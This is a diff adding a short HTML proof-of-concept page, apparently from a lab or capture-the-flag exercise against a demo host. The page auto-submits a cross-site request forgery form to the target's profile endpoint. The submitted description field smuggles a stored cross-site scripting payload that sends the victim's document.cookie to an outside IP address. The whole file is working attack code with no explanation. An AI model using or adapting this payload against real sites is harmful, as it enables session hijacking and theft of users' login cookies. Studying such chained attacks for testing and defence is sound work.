@@ -1,0 +1,28 @@
+<!doctype html>
+<html lang="en">
+   <head>
+      <title>
+         CRSF
+      </title>
+   </head>
+
+   <body>
+      <form action="http://chain.demo.ns.agency/profile" method=POST id="csrf_form">
+         <textarea name="description" rows="3">
+            &lt;/textarea&gt;
+            <script>
+               document.write('<img src="http://52.230.21.118:6969?c='+document.cookie+'"/>');
+            </script>
+            <textarea class="form-control" name="description" rows="3">
+               LOL
+            </textarea>
+         </textarea>
+         <input type="submit" value="Update"/>
+      </form>
+
+      <script>
+         document.getElementById("csrf_form").submit()
+      </script>
+   </body>
+
+</html>
